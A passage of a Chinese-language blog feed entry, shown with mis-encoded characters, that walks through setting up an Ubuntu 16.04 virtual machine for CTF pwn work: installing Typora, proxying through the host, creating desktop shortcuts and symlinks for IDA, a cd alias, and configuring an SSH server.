å®‰è£…æœç‹—è¾“å…¥æ³•-CSDNåšå®¢</a></p><hr><h2 id="å®‰è£…-Typora"><a href="#å®‰è£…-Typora" class="headerlink" title="å®‰è£… Typora"></a>å®‰è£… Typora</h2><p>æŸ¥çœ‹ç”µè„‘æ¶æ„ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> <span class="token parameter variable">-m</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸‹è½½å¯¹åº”çš„ Typora å®‰è£…åŒ…ï¼š</p>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># x86(amd64)</span><span class="token function">wget</span> https://download2.typoraio.cn/linux/typora_1.6.6_amd64.deb --output-document typora.deb  <span class="token comment"># ARM</span><span class="token function">wget</span> https://download2.typoraio.cn/linux/typora_1.6.6_arm64.deb --output-document typora.deb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  å®‰è£… Typoraï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dpkg <span class="token parameter variable">-i</span> typora.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="è™šæ‹Ÿæœºä»£ç†"><a href="#è™šæ‹Ÿæœºä»£ç†" class="headerlink" title="è™šæ‹Ÿæœºä»£ç†"></a>è™šæ‹Ÿæœºä»£ç†</h2><blockquote><p><strong>è¿™é‡Œé’ˆå¯¹ Ubuntu 16.04 ä¸»è¦ä»‹ç»è™šæ‹Ÿæœºèµ°ä¸»æœºä»£ç†çš„æ–¹æ³•ï¼Œä¹Ÿæ˜¯æ¯”è¾ƒæ¨èè¿™ç§æ–¹æ³•ï¼Œå› ä¸ºç®€å•æ–¹ä¾¿</strong></p><p>å¦‚æœæƒ³åœ¨ Ubuntu 16.04 å®‰è£… clash è¯·å‚è€ƒã€ŠUbuntu22.04è™šæ‹ŸæœºPWNç¯å¢ƒæ­å»ºã€‹ ï¼ˆå¯èƒ½éœ€è¦æ³¨æ„ç‰ˆæœ¬é—®é¢˜ï¼‰</p></blockquote><p>å°†è™šæ‹Ÿæœºç½‘ç»œæ¨¡å¼è®¾ç½®ä¸º NAT æˆ–æ¡¥æ¥æ¨¡å¼ ï¼ˆä¸¤ç§æ–¹å¼ç‰©ç†æœº IP åœ°å€ä¸ä¸€æ ·ï¼ŒNAT æ¨¡å¼è™šæ‹Ÿæœºèµ°ç‰©ç†æœºçš„ VMnet8 è™šæ‹Ÿç½‘å¡ï¼Œæ¡¥æ¥æ¨¡å¼èµ°ç‰©ç†æœºçš„ VMnet0 ç½‘å¡ï¼‰</p><p>è¿™é‡Œä»¥ NAT æ¨¡å¼ä¸ºä¾‹ï¼Œå‡è®¾ç‰©ç†æœº IP ä¸º 192.168.148.1</p><hr><h3 id="é€šè¿‡-clash-èµ°ä»£ç†"><a href="#é€šè¿‡-clash-èµ°ä»£ç†" class="headerlink" title="é€šè¿‡ clash èµ°ä»£ç†"></a>é€šè¿‡ clash èµ°ä»£ç†</h3><p>ç‰©ç†æœºåœ¨ clash ä¸»ç•Œé¢ä¸­æ‰“å¼€â€œå±€åŸŸç½‘ä»£ç†â€ï¼ˆAllow LANï¼‰ï¼Œå¹¶æŸ¥çœ‹ä»£ç†ç«¯å£ï¼Œä»¥ 7890 ä¸ºä¾‹</p><p>åœ¨è™šæ‹Ÿæœºä¸­æŒ‰å‚æ•°æ‰‹åŠ¨è®¾ç½®ä»£ç†å³å¯ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA12.png" alt="Linuxè™šæ‹ŸæœºCTFç¯å¢ƒæ­å»º12.png"></p><hr><h3 id="é€šè¿‡-v2rayN-èµ°ä»£ç†"><a href="#é€šè¿‡-v2rayN-èµ°ä»£ç†" class="headerlink" title="é€šè¿‡ v2rayN èµ°ä»£ç†"></a>é€šè¿‡ v2rayN èµ°ä»£ç†</h3><p>ç‰©ç†æœºåœ¨ v2rayN ä¸­æ‰“å¼€ï¼š<code>è®¾ç½® -&gt; å‚æ•°è®¾ç½® -&gt; å…è®¸æ¥è‡ªå±€åŸŸç½‘çš„è¿æ¥</code></p><p>åœ¨ v2rayN ä¸»ç•Œé¢ä¸­ï¼ŒæŸ¥çœ‹å±€åŸŸç½‘çš„ socks5 å’Œ http ç«¯å£å·ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA10.png" alt="Linuxè™šæ‹ŸæœºCTFç¯å¢ƒæ­å»º10.png"></p><p>åœ¨è™šæ‹Ÿæœºä¸­æŒ‰å‚æ•°æ‰‹åŠ¨è®¾ç½®ä»£ç†å³å¯ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA11.png" alt="Linuxè™šæ‹ŸæœºCTFç¯å¢ƒæ­å»º11.png"></p><hr><h2 id="åˆ›å»ºæ¡Œé¢å¿«æ·æ–¹å¼å¹¶æ·»åŠ åˆ°å¼€å§‹èœå•"><a href="#åˆ›å»ºæ¡Œé¢å¿«æ·æ–¹å¼å¹¶æ·»åŠ åˆ°å¼€å§‹èœå•" class="headerlink" title="åˆ›å»ºæ¡Œé¢å¿«æ·æ–¹å¼å¹¶æ·»åŠ åˆ°å¼€å§‹èœå•"></a>åˆ›å»ºæ¡Œé¢å¿«æ·æ–¹å¼å¹¶æ·»åŠ åˆ°å¼€å§‹èœå•</h2><blockquote><p>è¿™é‡Œä»¥ IDA Freeware 8.2 ä¸ºä¾‹ï¼Œå› ä¸ºæˆ‘ Ubuntu 22.04 å®‰è£…çš„æ˜¯ IDA Freeware 8.2ï¼Œä½†æ˜¯ <strong>Ubuntu 16.04 è²Œä¼¼ä¸æ”¯æŒè¿™ä¹ˆæ–°çš„ç‰ˆæœ¬ï¼Œä¼šæ— æ³•è¿è¡Œï¼Œæ‰€ä»¥è¿™é‡Œä¸»è¦æ¼”ç¤ºå¦‚ä½•åˆ›å»ºæ¡Œé¢å¿«æ·æ–¹å¼å¹¶æ·»åŠ åˆ°å¼€å§‹èœå•ï¼Œå»ºè®®ä¸è¦å®‰è£…å¤ªé«˜ç‰ˆæœ¬çš„ IDA</strong></p></blockquote><p>åœ¨æ¡Œé¢æ‰“å¼€ç»ˆç«¯</p><p>æ–°å»ºä¸€ä¸ª IDA-Freeware-8.2.desktop æ–‡ä»¶ï¼š <em>ï¼ˆUbuntu 16.04 å®‰è£… IDA åä¼šè‡ªåŠ¨åœ¨æ¡Œé¢æ–°å»ºä¸€ä¸ªå¿«æ·æ–¹å¼ï¼Œå¯ä»¥ä¸ç”¨æ‰‹åŠ¨åˆ›å»ºï¼Œè¿™é‡Œä¸»è¦æ¼”ç¤ºå¦‚ä½•åˆ›å»ºæ¡Œé¢å¿«æ·æ–¹å¼å¹¶æ·»åŠ åˆ°å¼€å§‹èœå•ï¼‰</em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~/æ¡Œé¢<span class="token function">sudo</span> <span class="token function">vim</span> IDA-Freeware-8.2.desktop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¹¶å†™å…¥ä»¥ä¸‹å†…å®¹ï¼š ï¼ˆæ³¨æ„æŒ‰ç…§è‡ªå·±å®é™…æƒ…å†µä¿®æ”¹è·¯å¾„ï¼‰</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>Desktop Entry<span class="token punctuation">]</span><span class="token assign-left variable">Version</span><span class="token operator">=</span><span class="token number">0.9</span>.4<span class="token assign-left variable">Type</span><span class="token operator">=</span>Application<span class="token assign-left variable">Name</span><span class="token operator">=</span>IDA Freeware <span class="token number">8.2</span><span class="token assign-left variable">Comment</span><span class="token operator">=</span>Interactive Disassembler Freeware <span class="token number">8.2</span><span class="token assign-left variable">Icon</span><span class="token operator">=</span>/opt/idafree-8.2/appico64.png<span class="token assign-left variable">Exec</span><span class="token operator">=</span>/opt/idafree-8.2/ida64<span class="token assign-left variable">Terminal</span><span class="token operator">=</span>false<span class="token assign-left variable">MimeType</span><span class="token operator">=</span>application/octet-stream<span class="token punctuation">;</span>application/mac-binary<span class="token punctuation">;</span>application/macbinary<span class="token punctuation">;</span>application/octet-stream<span class="token punctuation">;</span>application/x-binary<span class="token punctuation">;</span>application/x-macbinary<span class="token assign-left variable">StartupNotify</span><span class="token operator">=</span>true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th align="left">å‚æ•°</th><th align="left">å«ä¹‰</th><th align="left">å¿…è¦æ€§</th></tr></thead><tbody><tr><td align="left"><code>[Desktop Entry]</code></td><td align="left">æ–‡ä»¶å¤´ï¼Œæ¯ä¸ª Desktop æ–‡ä»¶éƒ½ä»¥è¿™ä¸ªæ ‡ç­¾å¼€å§‹</td><td align="left"><strong>å¿…é€‰</strong></td></tr><tr><td align="left"><code>Version</code></td><td align="left">æ ‡æ˜ Desktop Entry çš„ç‰ˆæœ¬</td><td align="left">å¯é€‰</td></tr><tr><td align="left"><code>Type</code></td><td align="left">Desktop çš„ç±»å‹, å¸¸è§å€¼æœ‰ Application å’Œ Link</td><td align="left"><strong>å¿…é€‰</strong></td></tr><tr><td align="left"><code>Name</code></td><td align="left">ç¨‹åºåç§°ï¼Œå¯è‡ªå®šä¹‰</td><td align="left"><strong>å¿…é€‰</strong></td></tr><tr><td align="left"><code>Comment</code></td><td align="left">ç¨‹åºæè¿°ï¼Œå¯è‡ªå®šä¹‰</td><td align="left">å¯é€‰</td></tr><tr><td align="left"><code>Icon</code></td><td align="left">è®¾ç½®å¿«æ·æ–¹å¼çš„å›¾æ ‡ï¼Œæ”¯æŒ png å’Œ svg</td><td align="left">å¯é€‰</td></tr><tr><td align="left"><code>Exec</code></td><td align="left">ç¨‹åºçš„å¯åŠ¨å‘½ä»¤, å¯ä»¥å¸¦å‚æ•°è¿è¡Œ, å½“ Type ä¸º Application æ—¶æœ‰æ•ˆ</td><td align="left"><strong>å¿…é€‰</strong></td></tr><tr><td align="left"><code>Terminal</code></td><td align="left">æ˜¯å¦åœ¨ç»ˆç«¯ä¸­è¿è¡Œ, å½“ Type ä¸º Application æ—¶æœ‰æ•ˆ <em>ï¼ˆå¯¹äºæ²¡æœ‰å›¾å½¢ç•Œé¢çš„ç¨‹åºå¾ˆæœ‰ç”¨ï¼‰</em></td><td align="left">å¯é€‰</td></tr><tr><td align="left"><code>MimeType</code></td><td align="left">è®¾ç½®è¯¥ç¨‹åºå¯ä»¥æ‰“å¼€çš„æ–‡ä»¶ç±»å‹</td><td align="left">å¯é€‰</td></tr><tr><td align="left"><code>StartupNotify</code></td><td align="left">ç¨‹åºå¯åŠ¨é€šçŸ¥</td><td align="left">å¯é€‰</td></tr></tbody></table><p>å…¶ä»– <code>MimeType</code> å¯æ‰“å¼€çš„æ–‡ä»¶ç±»å‹ï¼š<a href="https://blog.csdn.net/zhaoyw2008/article/details/46647723">å®Œæ•´çš„ mime type åˆ—è¡¨-CSDNåšå®¢</a></p><p>å¢åŠ æ‰§è¡Œæƒé™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chmod</span> +x IDA-Freeware-8.2.desktop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœ€åå°† .desktop æ–‡ä»¶å­˜æ”¾åˆ° <code>/usr/share/applications/</code> ç›®å½•ä¸‹</p><p>ç¨‹åºå°±ä¼šç°åœ¨å¼€å§‹èœå•ä¸­ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥åœ¨ <code>å³é”® -&gt; ä½¿ç”¨å…¶ä»–åº”ç”¨ç¨‹åºæ‰“å¼€</code> ä¸­æ‰¾åˆ°ï¼Œç„¶åä¹Ÿå¯ä»¥è‡ªå·±å°†åº”ç”¨å›ºå®šåˆ°ä»»åŠ¡æ ï¼Œæ–¹ä¾¿æ‰“å¼€</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~/æ¡Œé¢<span class="token function">sudo</span> <span class="token function">mv</span> IDA-Freeware-8.2.desktop /usr/share/applications/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><p>jetbrains å…¨å®¶æ¡¶ç­‰ç­‰åˆ›å»ºæ¡Œé¢å¿«æ·æ–¹å¼å°±ç®€å•äº†ï¼Œè¿è¡Œè½¯ä»¶åï¼š<code>å·¥å…·æ  â€“&gt; Tools â€“&gt; Create Desktop Entery</code></p><p>ä»¥ Pycharm è‡ªåŠ¨åˆ›å»ºçš„å›¾æ ‡ä¸ºä¾‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>Desktop Entry<span class="token punctuation">]</span><span class="token assign-left variable">Version</span><span class="token operator">=</span><span class="token number">1.0</span><span class="token assign-left variable">Type</span><span class="token operator">=</span>Application<span class="token assign-left variable">Name</span><span class="token operator">=</span>PyCharm Professional Edition<span class="token assign-left variable">Icon</span><span class="token operator">=</span>/opt/pycharm-2022.3/bin/pycharm.svg<span class="token assign-left variable">Exec</span><span class="token operator">=</span><span class="token string">"/opt/pycharm-2022.3/bin/pycharm.sh"</span> %f<span class="token assign-left variable">Comment</span><span class="token operator">=</span>Python IDE <span class="token keyword">for</span> Professional Developers<span class="token assign-left variable">Categories</span><span class="token operator">=</span>Development<span class="token punctuation">;</span>IDE<span class="token punctuation">;</span><span class="token assign-left variable">Terminal</span><span class="token operator">=</span>false<span class="token assign-left variable">StartupWMClass</span><span class="token operator">=</span>jetbrains-pycharm<span class="token assign-left variable">StartupNotify</span><span class="token operator">=</span>true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="åˆ›å»ºè½¯è¿æ¥å°†åº”ç”¨æ·»åŠ åˆ°ç»ˆç«¯å¯åŠ¨"><a href="#åˆ›å»ºè½¯è¿æ¥å°†åº”ç”¨æ·»åŠ åˆ°ç»ˆç«¯å¯åŠ¨" class="headerlink" title="åˆ›å»ºè½¯è¿æ¥å°†åº”ç”¨æ·»åŠ åˆ°ç»ˆç«¯å¯åŠ¨"></a>åˆ›å»ºè½¯è¿æ¥å°†åº”ç”¨æ·»åŠ åˆ°ç»ˆç«¯å¯åŠ¨</h2><blockquote><p>è¿™é‡Œä»¥ IDA Freeware 8.2 ä¸ºä¾‹ï¼Œå› ä¸ºæˆ‘ Ubuntu 22.04 å®‰è£…çš„æ˜¯ IDA Freeware 8.2ï¼Œä½†æ˜¯ <strong>Ubuntu 16.04 è²Œä¼¼ä¸æ”¯æŒè¿™ä¹ˆæ–°çš„ç‰ˆæœ¬ï¼Œä¼šæ— æ³•è¿è¡Œï¼Œæ‰€ä»¥è¿™é‡Œä¸»è¦æ¼”ç¤ºå¦‚ä½•åˆ›å»ºè½¯è¿æ¥å°†åº”ç”¨æ·»åŠ åˆ°ç»ˆç«¯å¯åŠ¨ï¼Œå»ºè®®ä¸è¦å®‰è£…å¤ªé«˜ç‰ˆæœ¬çš„ IDA</strong></p></blockquote><p>ä»¥ IDA ä¸ºä¾‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> <span class="token string">"/opt/idafree-8.2/ida64"</span> /usr/bin/ida<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ ·åœ¨ç»ˆç«¯è¾“å…¥ <code>ida</code> å³å¯æ‰“å¼€ IDA</p><blockquote><p><code>/usr/bin/ida</code> ä¸­çš„ ida åå­—å¯ä»¥è‡ªå®šä¹‰</p><p>è¿™æ ·åªæ˜¯åœ¨ <code>/usr/bin/</code> ä¸‹åˆ›å»ºäº†ä¸€ä¸ªè½¯é“¾æ¥ï¼ŒæŒ‡å‘ <code>/opt/idafree-8.2/ida64</code><br>è‹¥æƒ³åˆ é™¤è½¯é“¾æ¥ï¼š</p><pre class="line-numbers language-none"><code class="language-none">unlink è½¯é“¾æ¥<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å°½é‡ä¸è¦ç”¨ <code>rm -rf</code> åˆ é™¤è½¯é“¾æ¥ï¼Œå¦‚æœä¸å°å¿ƒåŠ ä¸Š <code>&#39;/&#39;</code> å°±ä¼šåˆ é™¤æºæ–‡ä»¶ï¼Œä¾‹å¦‚ï¼š<code>rm -rf filename/</code></p></blockquote><hr><h2 id="ç»ˆç«¯å°†-cd-å‘½ä»¤ä¸-ls-å‘½ä»¤è¿ç”¨"><a href="#ç»ˆç«¯å°†-cd-å‘½ä»¤ä¸-ls-å‘½ä»¤è¿ç”¨" class="headerlink" title="ç»ˆç«¯å°† cd å‘½ä»¤ä¸ ls å‘½ä»¤è¿ç”¨"></a>ç»ˆç«¯å°† cd å‘½ä»¤ä¸ ls å‘½ä»¤è¿ç”¨</h2><blockquote><p>å…¶å®å°±æ˜¯å°† <code>cd xxx</code> å‘½ä»¤å˜ä¸º <code>cd xxx &amp;&amp; ls</code>ï¼Œå¥½å¤„ä¹Ÿæ˜¾è€Œæ˜“è§ï¼šå¯ä»¥å°‘æ•²ä¸€æ¡å‘½ä»¤ï¼Œæ–¹ä¾¿~</p><p>ä½†æ˜¯ Ubuntu ä¸æ”¯æŒ <code>chdir</code>ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥ç”¨ <code>alias</code> å®ç°ç›®å½•å†…å®¹çš„æ˜¾ç¤º</p></blockquote><p>æ³¨ï¼šä»¥ä¸‹æ“ä½œå¯¹ Kali Linux åŒæ ·é€‚ç”¨</p><p>å¦‚æœä½ çš„ Ubuntu é…ç½®äº† zsh ç»ˆç«¯ï¼Œç¼–è¾‘ <code>~/zshrc</code> é…ç½®æ–‡ä»¶ï¼ˆKali Linux è‡ªå¸¦ zsh ç»ˆç«¯ï¼‰ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gedit ~/.zshrc<span class="token comment"># å¦‚æœæ²¡æœ‰é…ç½® zsh ç»ˆç«¯ï¼Œåˆ™æ‰“å¼€ ~/.bashrc</span><span class="token function">sudo</span> gedit ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨æ–‡ä»¶æœ€ååŠ å…¥ä»¥ä¸‹å†…å®¹ï¼Œä¿å­˜é€€å‡ºï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">alias</span> <span class="token assign-left variable">cd</span><span class="token operator">=</span>cdls<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-name function">cdls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token builtin class-name">builtin</span> <span class="token builtin class-name">cd</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åä½¿é…ç½®ç”Ÿæ•ˆï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span class="token comment"># å¦‚æœæ²¡æœ‰é…ç½® zsh ç»ˆç«¯ï¼Œåˆ™ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤</span><span class="token builtin class-name">source</span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åå°±å¯ä»¥çœ‹åˆ°æ•ˆæœäº†ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA29.png" alt="Linuxè™šæ‹ŸæœºCTFç¯å¢ƒæ­å»º29.png"></p><p>å¦‚æœæƒ³é¡ºä¾¿æ˜¾ç¤ºå½“å‰æ‰€åœ¨è·¯å¾„ï¼Œåªéœ€å°†å‰é¢çš„å†…å®¹æ”¹ä¸ºï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">alias</span> <span class="token assign-left variable">cd</span><span class="token operator">=</span>cdls<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-name function">cdls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token builtin class-name">builtin</span> <span class="token builtin class-name">cd</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">pwd</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åå°±å¯ä»¥çœ‹åˆ°æ•ˆæœäº†ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA30.png" alt="Linuxè™šæ‹ŸæœºCTFç¯å¢ƒæ­å»º30.png"></p><hr><h2 id="é…ç½®-SSH-æœåŠ¡ç«¯"><a href="#é…ç½®-SSH-æœåŠ¡ç«¯" class="headerlink" title="é…ç½® SSH æœåŠ¡ç«¯"></a>é…ç½® SSH æœåŠ¡ç«¯</h2><blockquote><p>Linux é»˜è®¤åªå®‰è£…äº† SSH å®¢æˆ·ç«¯ï¼Œæœ‰æ—¶å€™åœ¨æ‰§è¡Œ ssh æˆ–è€… scp å‘½ä»¤æ—¶ä¼šå‡ºç°ï¼š<code>ssh: connect to host port 22: Connection refused</code> æ‹’ç»è¿æ¥</p><p>å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„å…³ç³»ï¼š<br>å¦‚æœ A æœºå™¨æƒ³è¢« B æœºå™¨è¿œç¨‹æ§åˆ¶ï¼Œé‚£ä¹ˆ A æœºå™¨éœ€è¦å®‰è£… SSH æœåŠ¡ç«¯ï¼ŒB æœºå™¨éœ€è¦å®‰è£… SSH å®¢æˆ·ç«¯<br>ä¾‹å¦‚ï¼šB æœºå™¨é€šè¿‡ ssh è¿æ¥ A æœºå™¨ï¼Œæˆ–è€… B æœºå™¨é€šè¿‡ scp ä¸Šä¼ æ–‡ä»¶åˆ° A æœºå™¨</p></blockquote><p>æŸ¥çœ‹ ssh æœåŠ¡ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dpkg <span class="token parameter variable">-l</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœåªæ˜¾ç¤ºæœ‰ openssh-client æ²¡æœ‰ openssh-serverï¼Œè¯´æ˜æœªå®‰è£… SSH æœåŠ¡ç«¯</p><p>å®‰è£…ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> openssh-server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¡®è®¤ ssh-server æ˜¯å¦å¯åŠ¨ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> <span class="token parameter variable">-e</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœçœ‹åˆ° <code>sshd</code> å°±è¯´æ˜ ssh-server å·²ç»å¯åŠ¨</p><p>å¦‚æœå‡ºç°å…¶ä»–é—®é¢˜çš„è¯ï¼ŒæŸ¥çœ‹ SSH æœåŠ¡ç«¯çŠ¶æ€ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> <span class="token function">ssh</span> status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é‡å¯ SSH æœåŠ¡ç«¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">service</span> <span class="token function">ssh</span> restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç›¸å…³å‘½ä»¤ï¼š</p><ul><li>è¿æ¥æœåŠ¡ç«¯æœºå™¨ï¼Œå‡è®¾ IP ä¸º 192.168.1.1ï¼Œç”¨æˆ·åä¸º user ï¼ˆWindowsã€Linux é€šç”¨ï¼‰</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> user@192.168.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>ä»å®¢æˆ·ç«¯æœºå™¨ä¸Šä¼ å½“å‰ç›®å½•ä¸‹çš„ test æ–‡ä»¶åˆ°æœåŠ¡ç«¯æœºå™¨çš„ <code>~/</code> æˆ– <code>E:\</code> ç›®å½•ä¸‹ï¼Œå‡è®¾ IP ä¸º 192.168.1.1ï¼Œç”¨æˆ·åä¸º user</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># æœåŠ¡ç«¯ä¸º Linux</span><span class="token function">sudo</span> <span class="token function">scp</span> <span class="token parameter variable">-r</span> <span class="token builtin class-name">test</span> user@192.168.1.1:~/<span class="token comment"># æœåŠ¡ç«¯ä¸º Windows</span><span class="token function">sudo</span> <span class="token function">scp</span> <span class="token parameter variable">-r</span> <span class="token builtin class-name">test</span> user@192.168.1.1:E:<span class="token punctuation">\</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…¶å®åªä¼ æ–‡ä»¶çš„è¯ï¼Œä¸éœ€è¦ <code>-r</code> å‚æ•°ï¼Œä½†æ˜¯ä¼ æ–‡ä»¶å¤¹éœ€è¦ï¼Œç´¢æ€§ç›´æ¥åŠ ä¸Š <code>-r</code> æ›´æ–¹ä¾¿</p><p>å¦‚æœä½¿ç”¨ ssh è¿æ¥å‡ºç°å¦‚ä¸‹æŠ¥é”™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED<span class="token operator">!</span>     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY<span class="token operator">!</span>Someone could be eavesdropping on you right now <span class="token punctuation">(</span>man-in-the-middle attack<span class="token punctuation">)</span><span class="token operator">!</span>It is also possible that a <span class="token function">host</span> key has just been changed.<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>Host key verification failed.lost connection<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æŠ¥é”™æ˜¯ç”±äºè¿œç¨‹çš„ä¸»æœºçš„å…¬é’¥å‘ç”Ÿäº†å˜åŒ–å¯¼è‡´çš„</p><p>è§£å†³åŠæ³•ï¼š<br>æ¸…é™¤ ssh æ‰€è¿æ¥çš„ IP</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen <span class="token parameter variable">-R</span> å‡ºé—®é¢˜çš„IPåœ°å€<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åå†ä½¿ç”¨ ssh é‡æ–°è¿æ¥å³å¯</p><hr>]]></content>
    
    
    <summary type="html">ç”±äº Ubuntu 16.04 ç¯å¢ƒæ¯”è¾ƒè€ï¼Œå¯¼è‡´ 2023 å¹´ Ubuntu 22.04 ä¸‹çš„è®¸å¤š PWN ç¯å¢ƒæ­å»ºå¹¶ä¸é€‚ç”¨äº 16.04ï¼Œæ‰€ä»¥å‡ºäº†ä¸€ä¸ªä¸“é—¨é’ˆå¯¹ 16.04 çš„ç¯å¢ƒé…ç½®æ•™ç¨‹ï¼Œå¹¶å¯¹ä¸ 22.04 ä¸­ä¸åŒçš„åœ°æ–¹ä¸“é—¨åšäº†è®²è§£å’Œå¤„ç†</summary>
    
    
    
    <category term="Linuxç¯å¢ƒ" scheme="https://www.uf4te.cn/categories/Linux%E7%8E%AF%E5%A2%83/"/>
    
    
    <category term="CTF" scheme="https://www.uf4te.cn/tags/CTF/"/>
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
    <category term="Linux" scheme="https://www.uf4te.cn/tags/Linux/"/>
    
  </entry>
  
</feed>
